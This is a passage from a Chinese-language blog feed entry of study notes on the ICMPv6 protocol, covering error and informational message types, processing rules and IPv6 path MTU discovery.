title="超时报文"></a>超时报文</h5><ul><li>代码为0:当IPv6报头中的跳数限制字段在转发过程中减小为0时，路由器发送ICMPv6超时报文</li><li>代码为1:当目标主机的分片重组定时器超时，目标主机发送，RFC2460规定分片重组时间为60秒</li></ul><img src="./IPv6协议结构/报文超时差错报文.png" style="zoom:67%;" /><h5 id="参数问题"><a href="#参数问题" class="headerlink" title="参数问题"></a>参数问题</h5><blockquote><p>当IPv6报文或扩展报头出现错误，从而导致IPv6不能进行进一步处理时，发送该报文。该报文由路由器或者目标节点发送</p></blockquote><ul><li>代码为0表示遇到错误的报头字段</li><li>代码为1表示遇到无法识别的下一个报头类型</li><li>代码为2表示遇到无法识别的IPv6选项。</li></ul><blockquote><p style="color:blue;">指针字段指出了IPv6数据包中错误发生的位置，其值为从0开始的字节偏移量</p></blockquote><h4 id="ICMPv6信息报文"><a href="#ICMPv6信息报文" class="headerlink" title="ICMPv6信息报文"></a>ICMPv6信息报文</h4><ul><li>信息报文提供诊断功能和附加的主机功能，比如多播侦听发现(MLD）协议和邻居发现协议。在所有的ICMPv6信息报文中，8位类型字段中的最高位都为1。因此，类型字段的范围是128～255。</li></ul><img src="./IPv6协议结构/ICMPv6信息报文与差错报文.png" style="zoom: 67%;" /><h5 id="回送请求报文"><a href="#回送请求报文" class="headerlink" title="回送请求报文"></a>回送请求报文</h5><ul><li>ICMPv6回送请求报文用于发送至目标节点，以请求目标节点立即发回一个回送应答报文</li><li>发送方主机设置标识符字段和序列号字段，用于将收到的回送应答报文与发送的回送请求报文进行匹配</li></ul><img src="./IPv6协议结构/回送请求报文.png" style="zoom:67%;" /><h5 id="回送应答报文"><a href="#回送应答报文" class="headerlink" title="回送应答报文"></a>回送应答报文</h5><ul><li>ICMPv6回送应答报文用于响应接收到的ICMPv6回送请求报文</li><li>回送应答报文的标识符字段，序列号字段和数据字段的值被置为与回送请求报文中的相应字段一样的值</li></ul><img src="./IPv6协议结构/回送应答报文.png" style="zoom:67%;" /><h3 id="ICMP处理规则"><a href="#ICMP处理规则" class="headerlink" title="ICMP处理规则"></a>ICMP处理规则</h3><blockquote><p>如果节点收到一条未知类型的ICMPv6错误报文，必须把它传送给上层协议</p></blockquote><blockquote><p>如果节点收到一条未知类型的ICMPv6信息报文，必须将其丢弃</p></blockquote><p>每一个ICMPv6差错报文（类型&lt;128）在不超过最小IPv6 MTU的情况下，包括尽可能大的引起出错的包。</p><p>网络层协议把ICMPv6差错报文传送到上层协议的进程时，原包中的上层协议字段被取出，用来选择合适的上一层进程来处理错误。如果原包含有一个很大的扩展首部，那么有可能上层协议类型并没有包含在ICMPv6差错报文中。原因是为了满足最小IPv6 MTU的限制，原包被切断了。这种情况下，差错报文在任何IPv6层处理后被丢弃。</p><p>如果接收到的数据包为下列情况之一，则不发送ICMPv6差错报文:</p><pre class="line-numbers language-none"><code class="language-none">ICMPv6错误报文，一个ICMPv6重定向报文，一个发往多播地址的，链路层多播包，链路层广播包，一个源地址不能唯一确定某个单独节点的数据包<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对上述情况，存在两个例外，即包过大报文和代码为2，表示不可识别的lPv6选项的参数问题报文。</p><h4 id="路径MTU发现"><a href="#路径MTU发现" class="headerlink" title="路径MTU发现"></a>路径MTU发现</h4><h5 id="lPv6-MTU"><a href="#lPv6-MTU" class="headerlink" title="lPv6 MTU"></a>lPv6 MTU</h5><ul><li>IPv6要求链路层的最小MTU为1280字节，建议MTU长度最小为1500字节</li><li><strong>PMTU:从源到目的节点的所有链路上最小的链路MTU</strong></li><li><strong>PMTU发现的目的是为了确保可以使用某个路径上支持的最大可能的大小来发送数据包</strong></li></ul><h5 id="路径MTU发现工作过程"><a href="#路径MTU发现工作过程" class="headerlink" title="路径MTU发现工作过程"></a>路径MTU发现工作过程</h5><ul><li>首先主机假定PMTU与第一跳链路的MTU相同，并且使用该大小发送数据包</li><li>如果该数据包对于路径中某个路由器过大，路由器丢弃该数据包并返回类型为“数据包过大”的ICMPv6消息，且该消息中包含下一跳链路的MTU大小</li><li>主机使用这个MTU来把后续的包发往同一目的地。主机发送的数据包肯定不会小于IPv6的最小MTU (1280 Bytes)</li><li>重复上述过程，直到数据包到达目的地。</li></ul><h5 id="PMTU的改变"><a href="#PMTU的改变" class="headerlink" title="PMTU的改变"></a>PMTU的改变</h5><ul><li>由于路由拓扑结构的变化，源节点和目标节点之间的路径会随着时间而改变。·路径MTU的减小，可以通过接收到的ICMPv6包过大报文被立即发现。而路径MTU的增大，则必须通过发送方的检测才能发现。根据RFC1981，发送方可以通过试图发送更长的数据包来进行检测。而这种检测应该在距离接收到ICMPv6包过大报文最少5分钟(建议取10分钟)之后进行</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ICMPv6协议&quot;&gt;&lt;a href=&quot;#ICMPv6协议&quot; class=&quot;headerlink&quot; title=&quot;ICMPv6协议&quot;&gt;&lt;/a&gt;ICMPv6协议&lt;/h2&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-Py</summary>
      
    
    
    
    <category term="网络工程相关" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3/"/>
    
    
    <category term="网络协议分析" scheme="https://shierjinghuang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
